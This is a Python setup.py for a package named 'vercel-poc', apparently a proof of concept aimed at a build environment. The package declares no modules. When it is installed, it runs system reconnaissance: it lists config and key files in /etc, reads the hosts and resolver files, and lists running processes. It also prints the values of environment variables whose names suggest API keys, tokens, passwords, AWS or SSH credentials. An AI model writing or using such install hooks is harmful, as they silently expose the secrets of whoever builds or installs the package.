from setuptools import setup
import os
import subprocess

def run(cmd):
    try:
 
        return subprocess.getoutput(cmd)
    except:
        return "Error executing command"

print("\n" + "!"*60)
print("--- DEEP SYSTEM SCAN START ---")
 
print(f"[#] KERNEL: {run('uname -a')}")
print(f"[#] DISK USAGE: \n{run('df -h | grep /app')}")
 
print("\n[!] SEARCHING FOR SECRETS IN /etc:")
 
print(run("find /etc -maxdepth 2 -name '*conf*' -o -name '*key*' 2>/dev/null | head -n 10"))

 
print("\n[!] NETWORK ENVIROMENT:")
print(f"HOSTS:\n{run('cat /etc/hosts')}")
print(f"RESOLV:\n{run('cat /etc/resolv.conf')}")
 
print("\n[!] FULL ENV DUMP (SENSITIVE):")
sensitive_keys = ['API', 'TOKEN', 'SECRET', 'PASS', 'DATABASE', 'AWS', 'GIT', 'SSH']
for k, v in os.environ.items():
    if any(x in k.upper() for x in sensitive_keys):
        print(f"MATCH FOUND: {k} = {v}")

 
print("\n[!] RUNNING PROCESSES:")
print(run("ps aux | head -n 20"))

print("--- DEEP SYSTEM SCAN END ---")
print("!"*60 + "\n")

setup(
    name="vercel-poc",
    version="1.0.1",
    packages=[],
)
